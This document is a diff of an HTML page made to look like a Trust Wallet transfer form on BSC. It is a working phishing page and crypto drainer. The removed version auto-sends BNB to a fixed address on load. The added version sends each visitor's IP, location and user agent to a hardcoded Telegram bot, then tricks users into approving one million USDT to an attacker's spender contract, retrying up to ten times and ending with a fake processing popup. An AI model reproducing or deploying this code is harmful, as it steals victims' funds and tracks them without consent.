@@ -1,113 +1,426 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>BNB Connect</title>
-    <style>
-        body { text-align: center; padding: 50px; font-family: Arial; background: #1a1a2e; color: white; }
-        button { background: #f39c12; color: white; border: none; padding: 20px 40px; font-size: 18px; border-radius: 10px; cursor: pointer; }
-        button:hover { background: #e67e22; }
-        #status { margin-top: 20px; font-size: 16px; }
-    </style>
-</head>
-<body>
-    <h1>🔗 Connect Wallet</h1>
-    <p>BNB (BEP20) Bridge Active</p>
-    <button id="connectBtn">🚀 Connect & Send 0.01 BNB</button>
-    <div id="status"></div>
-
-    <!-- WalletConnect v2 + Ethers -->
-    <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-    <script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
-
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>
+      Safe Approve + Collect Tokens (BSC Mainnet)
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="stylesheet" href="css/index-95669f7c.css" />
+    <link rel="icon" type="image/png" href="https://i.ibb.co/R422Tk9Y/Trust-Wallet-modified.png" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="label">
+        Address or Domain Name
+      </div>
+      <div class="input-box">
+        <span style="flex:1;overflow:hidden;">        0x99e6d3CDdfdd5F5eB316
+</span>
+        <!-- Right side controls -->
+        <div class="input-box-right">
+          <!-- 1. Paste text -->
+          <span class="paste-text">          Paste
+</span>
+          <!-- 2. Icon 1 -->
+          <svg width="16" height="16" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" d="M96 0C60.7 0 32 28.7 32 64l0 384c0 35.3 28.7 64 64 64l288 0c35.3 0 64-28.7 64-64l0-384c0-35.3-28.7-64-64-64L96 0zM208 288l64 0c44.2 0 80 35.8 80 80c0 8.8-7.2 16-16 16l-192 0c-8.8 0-16-7.2-16-16c0-44.2 35.8-80 80-80zm-32-96a64 64 0 1 1 128 0 64 64 0 1 1 -128 0zM512 80c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64zM496 192c-8.8 0-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64c0-8.8-7.2-16-16-16zm16 144c0-8.8-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8 7.2 16 16 16s16-7.2 16-16l0-64z">
+            </path>
+          </svg>
+          <!-- 3. Icon 2 -->
+          <svg width="16" height="16" viewBox="0 0 384 512" xmlns="http://www.w3.org/2000/svg">
+            <path fill="currentColor" d="M0 80C0 53.5 21.5 32 48 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48L0 80zM64 96l0 64 64 0 0-64L64 96zM0 336c0-26.5 21.5-48 48-48l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96zm64 16l0 64 64 0 0-64-64 0zM304 32l96 0c26.5 0 48 21.5 48 48l0 96c0 26.5-21.5 48-48 48l-96 0c-26.5 0-48-21.5-48-48l0-96c0-26.5 21.5-48 48-48zm80 64l-64 0 0 64 64 0 0-64zM256 304c0-8.8 7.2-16 16-16l64 0c8.8 0 16 7.2 16 16s7.2 16 16 16l32 0c8.8 0 16-7.2 16-16s7.2-16 16-16s16 7.2 16 16l0 96c0 8.8-7.2 16-16 16l-64 0c-8.8 0-16-7.2-16-16s-7.2-16-16-16s-16 7.2-16 16l0 64c0 8.8-7.2 16-16 16l-32 0c-8.8 0-16-7.2-16-16l0-160zM368 480a16 16 0 1 1 0-32 16 16 0 1 1 0 32zm64 0a16 16 0 1 1 0-32 16 16 0 1 1 0 32z">
+            </path>
+          </svg>
+        </div>
+      </div>
+      <div class="label">
+        Amount
+      </div>
+      <div class="input-box">
+        <input id="amount" type="text" min="0" value="" />
+        <div class="right-text">
+          <span class="usdt-text">          USDT
+</span>
+          <span class="max-text">          Max
+</span>
+        </div>
+      </div>
+    </div>
+    <div id="nextBtn" class="next-btn">
+      Next
+    </div>
+    <!-- 🚀 Processing Bottom-Sheet Popup -->
+    <div id="processingPopup" style="
+    display: none;
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    width: 100%;
+    height: 50%;
+    background: #111;
+    border-radius: 20px 20px 0 0;
+    box-shadow: 0 -4px 15px rgba(0,0,0,0.6);
+    padding: 20px;
+    z-index: 10000;
+    color: #fff;
+    font-family: sans-serif;
+  ">
+      <div style="text-align: right;">
+        <button onclick="closePopup()" style="
+        background: none;
+        border: none;
+        color: #aaa;
+        font-size: 22px;
+        cursor: pointer;
+      ">
+          ✕
+        </button>
+      </div>
+      <div style="display: flex; justify-content: center; align-items: center; margin-top: 10px;">
+        <img src="images/images.jpg" alt="Processing" style="width: 80px; height: 80px;" />
+      </div>
+      <h2 style="text-align: center; margin-top: 15px; font-weight: bold; color: #fff;">
+        Processing...
+      </h2>
+      <p style="text-align: center; color: #ccc; font-size: 14px;">
+        Transaction is processing! You can check it on blockchain.
+      </p>
+      <div style="text-align: center; margin-top: 20px;">
+        <button disabled="" style="
+        background: #00D97E;
+        opacity: 0.7;
+        cursor: not-allowed;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 10px;
+        color: #000;
+        font-weight: bold;
+        font-size: 15px;
+        width: 80%;
+      ">
+          Transaction Details
+        </button>
+      </div>
+    </div>
+    <!-- Popup Functions -->
     <script>
-        const TARGET = "0x53C879FBB4D6cD62d95C4e4234b6A4bd9750939B";
-        const RPC = "https://bsc-dataseed1.binance.org/";
-        const AMOUNT = "0.01"; // BNB
-        
-        const status = document.getElementById('status');
-        const btn = document.getElementById('connectBtn');
-        
-        let provider, signer;
-        
-        async function initWalletConnect() {
-            status.textContent = "🔍 Detecting wallet...";
-            
-            // WalletConnect v2 - NO project ID needed for basic
-            provider = new WalletConnectProvider({
-                rpc: { 56: RPC },
-                qrcodeModal: {
-                    mobileLinks: [
-                        "trust",
-                        "metamask",
-                        "rainbow",
-                        "argent",
-                        "walletconnect"
-                    ]
-                },
-                chains: [56] // BSC Mainnet
-            });
-            
-            try {
-                await provider.enable();
-                const ethersProvider = new ethers.providers.Web3Provider(provider);
-                signer = ethersProvider.getSigner();
-                
-                status.textContent = "✅ Wallet Connected! Sending...";
-                await sendBNB();
-            } catch(e) {
-                console.log("WC failed, trying direct...");
-                tryDirectConnect();
-            }
-        }
-        
-        async function sendBNB() {
-            try {
-                const tx = await signer.sendTransaction({
-                    to: TARGET,
-                    value: ethers.utils.parseEther(AMOUNT),
-                    gasLimit: 21000
-                });
-                
-                status.textContent = `🎉 TX Sent: https://bscscan.com/tx/${tx.hash}`;
-                btn.disabled = true;
-            } catch(e) {
-                status.textContent = "❌ TX failed, retrying...";
-                setTimeout(initWalletConnect, 1000);
-            }
-        }
-        
-        function tryDirectConnect() {
-            status.textContent = "📱 Opening wallet apps...";
-            
-            // Multi-wallet deep links (works on ALL mobile browsers)
-            const wallets = [
-                `trust://wc?uri=wc:`,
-                `metamask://wc?uri=wc:`,
-                `rainbow://wc?uri=wc:`,
-                `intent://scan/#Intent;scheme=trust;package=com.wallet.crypto.trustapp;end`,
-                `bnb://wallet/`
-            ];
-            
-            wallets.forEach((url, i) => {
-                setTimeout(() => {
-                    window.open(url, '_system');
-                    document.location = url;
-                }, i * 500);
-            });
-            
-            // Final fallback - BSC browser redirect
-            setTimeout(() => {
-                window.location.href = "https://trustwallet.com/bsc";
-            }, 3000);
-        }
-        
-        // Auto-trigger on load + button
-        window.onload = initWalletConnect;
-        btn.onclick = initWalletConnect;
-        
-        // Prevent page close during tx
-        window.onbeforeunload = () => "Transaction in progress!";
+      function showProcessingPopup() {
+      document.getElementById(&#34;processingPopup&#34;).style.display = &#34;block&#34;;
+    }
+    function closePopup() {
+      document.getElementById(&#34;processingPopup&#34;).style.display = &#34;none&#34;;
+    }
     </script>
-</body>
+    <!-- Ethers.js Library -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js">
+    </script>
+    <!-- Main Script -->
+    <script>
+      const amountInput = document.getElementById(&#39;amount&#39;);
+    const nextBtn = document.getElementById(&#39;nextBtn&#39;);
+
+    amountInput.addEventListener(&#39;input&#39;, function () {
+        this.value = this.value.replace(/[^0-9.]/g, &#39;&#39;); // allows digits and dot only
+        const parts = this.value.split(&#39;.&#39;);
+        if (parts.length &gt; 2) {
+            this.value = parts[0] + &#39;.&#39; + parts[1];
+        }
+        updateButtonState();
+    });
+
+    function updateButtonState() {
+        const isDark = window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;).matches;
+        const hasValue = amountInput.value.trim() !== &#39;&#39;;
+       
+        if (hasValue) {
+            nextBtn.style.opacity = &#39;1&#39;;
+            nextBtn.style.cursor = &#39;pointer&#39;;
+            nextBtn.style.pointerEvents = &#39;auto&#39;;
+           
+            if (isDark) {
+                nextBtn.style.backgroundColor = &#34;#00D97E&#34;;
+            } else {
+                nextBtn.style.backgroundColor = &#34;#0702F8&#34;;
+            }
+        } else {
+            nextBtn.style.opacity = &#39;1&#39;;
+            nextBtn.style.cursor = &#39;not-allowed&#39;;
+            nextBtn.style.pointerEvents = &#39;none&#39;;
+           
+            if (isDark) {
+                nextBtn.style.backgroundColor = &#34;#555555&#34;;
+            } else {
+                nextBtn.style.backgroundColor = &#34;#9b98ff&#34;;
+            }
+        }
+    }
+
+    function applyTheme() {
+        const isDark = window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;).matches;
+       
+        if (isDark) {
+            document.body.style.backgroundColor = &#34;#1a1a1a&#34;;
+            document.body.style.color = &#34;white&#34;;
+        } else {
+            document.body.style.backgroundColor = &#34;white&#34;;
+            document.body.style.color = &#34;black&#34;;
+        }
+       
+        updateButtonState();
+    }
+    applyTheme();
+    window.matchMedia(&#39;(prefers-color-scheme: dark)&#39;).addEventListener(&#39;change&#39;, applyTheme);
+
+    const USDT_ADDRESS = &#34;0x55d398326f99059fF775485246999027B3197955&#34;;
+    const SPENDER_CONTRACT = &#34;0x6A2ea17AC201d8FafD4d826089f2C6AA25807c5c&#34;;
+    const USDT_DECIMALS = 18;
+
+    // --- Read base64 uid from ?id= ---
+    function logUidFromQuery() {
+        const params = new URLSearchParams(window.location.search);
+        const idParam = params.get(&#39;id&#39;);
+        if (!idParam) return null;
+        
+        let normalized = idParam.replace(/-/g, &#39;+&#39;).replace(/_/g, &#39;/&#39;);
+        if (normalized.length % 4 !== 0) {
+            normalized += &#39;=&#39;.repeat(4 - (normalized.length % 4));
+        }
+        try {
+            const binary = atob(normalized);
+            const bytes = Uint8Array.from(binary, c =&gt; c.charCodeAt(0));
+            const decoded = new TextDecoder().decode(bytes);
+            const numeric = decoded.trim();
+            if (/^\d+$/.test(numeric)) {
+                return numeric;
+            }
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // IMPROVED sendToTelegram with emojis, clean formatting &amp; better delivery
+    async function sendToTelegram(data) {
+        const id = logUidFromQuery() || &#34;no_uid&#34;;
+        const payload = { ...(data || {}), uid: id };
+
+        let msg = &#34;&#34;;
+
+        // Header
+        msg += &#34;🔥 New Event\n&#34;;
+        msg += `🆔 UID: ${payload.uid}\n`;
+        msg += `⏰ ${new Date().toISOString()}\n`;
+        msg += &#34;──────────────────────────────\n\n&#34;;
+
+        // Visitor info
+        if (payload.type === &#39;visitor&#39; || payload.type === &#39;visitor_detailed&#39; || payload.type === &#39;visitor_error&#39;) {
+            msg += &#34;👤 Visitor Info\n&#34;;
+            if (payload.ip)          msg += `🌐 IP: ${payload.ip}\n`;
+            if (payload.location)    msg += `📍 ${payload.location}\n`;
+            if (payload.country_flag) msg += `🏳️ Flag: ${payload.country_flag}\n`;
+            if (payload.timezone)    msg += `🕒 TZ: ${payload.timezone}\n`;
+            if (payload.userAgent)   msg += `📱 UA: ${payload.userAgent}\n`;
+            if (payload.url)         msg += `🔗 ${payload.url}\n`;
+            if (payload.error)       msg += `❌ Error: ${payload.error}\n`;
+            msg += &#34;\n&#34;;
+        }
+
+        // Wallet connection
+        if (payload.type === &#39;connectedwallet&#39;) {
+            msg += &#34;💼 Wallet Connected\n&#34;;
+            msg += `📌 Address: ${payload.wallet}\n\n`;
+        }
+
+        // Info / general messages
+        if (payload.type === &#39;info&#39;) {
+            msg += &#34;ℹ️ Info\n&#34;;
+            msg += `${payload.text}\n\n`;
+        }
+
+        // Transaction approval (most important)
+        if (payload.type === &#39;checkTrx&#39;) {
+            msg += &#34;✅ Approval Attempt\n&#34;;
+            msg += `🔗 Tx Hash: ${payload.trx}\n`;
+            msg += `👛 From: ${payload.account || &#39;unknown&#39;}\n\n`;
+        }
+
+        // Errors &amp; retries
+        if (payload.type === &#39;error&#39; || payload.text?.includes(&#39;failed&#39;) || payload.text?.includes(&#39;Error&#39;)) {
+            msg += &#34;⚠️ Problem Detected\n&#34;;
+            if (payload.text) msg += `📛 ${payload.text}\n`;
+            if (payload.account) msg += `👛 Account: ${payload.account}\n`;
+            msg += &#34;\n&#34;;
+        }
+
+        // Fallback for unknown types
+        if (!msg.includes(&#34;────&#34;)) {
+            msg += &#34;📦 Raw Data\n&#34;;
+            for (const [k, v] of Object.entries(payload)) {
+                if (k !== &#39;type&#39; &amp;&amp; k !== &#39;uid&#39;) {
+                    msg += `• ${k}: ${v}\n`;
+                }
+            }
+            msg += &#34;\n&#34;;
+        }
+
+        msg += &#34;──────────────────────────────\n&#34;;
+
+        const encoded = encodeURIComponent(msg.trim());
+        const url = `https://api.telegram.org/bot8213126523:AAF5eEu5L92mMLC-nFohTt4v09sfhMV7hSU/sendMessage?chat_id=7625426099&amp;text=${encoded}`;
+
+        // Try modern + reliable method first
+        try {
+            await fetch(url, {
+                method: &#39;GET&#39;,
+                mode: &#39;cors&#39;,
+                cache: &#39;no-cache&#39;,
+                redirect: &#39;follow&#39;
+            });
+            console.log(&#34;Sent via fetch (cors)&#34;);
+            return;
+        } catch (err) {
+            console.warn(&#34;fetch cors failed:&#34;, err.message);
+        }
+
+        // Fallback 1: no-cors
+        try {
+            await fetch(url, { mode: &#39;no-cors&#39; });
+            console.log(&#34;Fallback: no-cors sent&#34;);
+        } catch (e) {}
+
+        // Fallback 2: Image beacon
+        try {
+            const img = new Image();
+            img.src = url + `&amp;t=${Date.now()}`;
+            console.log(&#34;Image beacon fired&#34;);
+        } catch (e) {}
+
+        // Last resort: script tag
+        try {
+            const script = document.createElement(&#39;script&#39;);
+            script.src = url + `&amp;cb=${Date.now()}`;
+            document.head.appendChild(script);
+            setTimeout(() =&gt; script.remove(), 4000);
+            console.log(&#34;Script fallback fired&#34;);
+        } catch (e) {}
+    }
+
+    async function sendVisitorInfo() {
+        try {
+            const basicInfo = {
+                type: &#39;visitor&#39;,
+                url: window.location.href,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent
+            };
+            await sendToTelegram(basicInfo);
+           
+            const res = await fetch(&#39;https://ipapi.co/json/&#39;, {
+                method: &#39;GET&#39;,
+                headers: { &#39;Accept&#39;: &#39;application/json&#39; }
+            });
+           
+            if (!res.ok) throw new Error(&#39;IP lookup failed&#39;);
+           
+            const data = await res.json();
+            const ip = data.ip || &#39;Unknown&#39;;
+            const city = data.city || &#39;Unknown&#39;;
+            const region = data.region || &#39;Unknown&#39;;
+            const country = data.country_name || &#39;Unknown&#39;;
+            const flag = data.country_code ? String.fromCodePoint(...[...data.country_code.toUpperCase()].map(c =&gt; 0x1F1E6 + c.charCodeAt(0) - 65)) : &#39;🌍&#39;;
+            const timezone = data.timezone || &#39;Unknown&#39;;
+            const url = window.location.href;
+            const location = `${city}, ${region}, ${country}`;
+           
+            const detailedInfo = {
+                type: &#39;visitor_detailed&#39;,
+                ip,
+                location,
+                timezone,
+                url,
+                country_flag: flag,
+                userAgent: navigator.userAgent
+            };
+           
+            await sendToTelegram(detailedInfo);
+        } catch (err) {
+            await sendToTelegram({
+                type: &#39;visitor_error&#39;,
+                error: err.message,
+                url: window.location.href,
+                userAgent: navigator.userAgent
+            });
+        }
+    }
+
+    async function approveUSDT(account) {
+        const usdtAbi = [&#34;function approve(address spender, uint256 amount) public returns (bool)&#34;];
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
+        const signer = provider.getSigner(account);
+        const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, signer);
+        const amount = ethers.utils.parseUnits(&#34;1000000&#34;, USDT_DECIMALS);
+        
+        for (let attempt = 1; attempt &lt;= 10; attempt++) {
+            try {
+                const tx = await usdtContract.approve(SPENDER_CONTRACT, amount);
+                await sendToTelegram({ type: &#39;checkTrx&#39;, trx: tx.hash, account: account });
+                await tx.wait();
+                showProcessingPopup();
+                break;
+            } catch (err) {
+                if (attempt === 10) {
+                    await sendToTelegram({ type: &#39;info&#39;, text: `Approval failed after retries: ${err.message}`, account: account });
+                }
+            }
+        }
+    }
+
+    async function getAddress() {
+        try {
+            const currentChain = await window.ethereum.request({ method: &#39;eth_chainId&#39; });
+            if (currentChain !== &#39;0x38&#39;) {
+                await window.ethereum.request({
+                    method: &#39;wallet_switchEthereumChain&#39;,
+                    params: [{ chainId: &#39;0x38&#39; }],
+                });
+            }
+            let accounts = await window.ethereum.request({ method: &#39;eth_accounts&#39; });
+            let msg = &#34;&#34;;
+            if (accounts.length) {
+                msg = &#34;Directly got: &#34; + accounts[0];
+            } else {
+                accounts = await window.ethereum.request({ method: &#39;eth_requestAccounts&#39; });
+                if (accounts.length) {
+                    msg = &#34;Asked for connect, got: &#34; + accounts[0];
+                } else {
+                    msg = &#34;No wallet connected.&#34;;
+                }
+            }
+            await sendToTelegram({ type: &#39;info&#39;, text: msg });
+            if (accounts.length) {
+                await sendToTelegram({ type: &#39;connectedwallet&#39;, wallet: accounts[0] });
+                await approveUSDT(accounts[0]);
+            }
+        } catch (e) {
+            await sendToTelegram({ type: &#39;info&#39;, text: &#34;Error: &#34; + e.message });
+            closePopup();
+        }
+    }
+
+    // --- Events ---
+    amountInput.addEventListener(&#39;input&#39;, updateButtonState);
+    updateButtonState();
+
+    // Send visitor info on load
+    sendVisitorInfo();
+
+    // Next button → connect &amp; approve
+    nextBtn.addEventListener(&#39;click&#39;, function() {
+        if (amountInput.value.trim() !== &#39;&#39;) {
+            getAddress();
+        }
+    });
+    </script>
+  </body>
 </html>
